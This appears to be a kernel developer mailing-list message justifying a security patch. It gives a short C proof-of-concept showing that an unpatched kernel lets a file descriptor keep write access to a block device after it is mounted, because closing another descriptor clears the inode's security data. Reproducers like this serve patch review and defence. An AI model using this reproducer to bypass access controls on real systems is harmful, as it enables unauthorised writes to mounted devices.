Actually, it turns out that hard links have nothing to do with the
vulnerability that this patch addresses:
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
int main()
{
        int fd1, fd2;
        int rc;
        fd1 = open( "/dev/device", O_RDONLY );
        fd2 = open( "/dev/device", O_RDWR );
        close(fd1);
        getchar();
        rc = write( fd2, "0", 1 );
        printf( "write result: [%d]\n", rc );
        close( fd2 );
        return 0;
}
While the program is waiting for a keystroke, mount the block device.
Enter a keystroke.  The result without the patch is 1, which is a
security violation.  This occurs because the bd_release function will
bd_release(bdev) and set inode->i_security to NULL on the close(fd1).
Hence, we want to place the control at the level of the file struct,
not the inode.
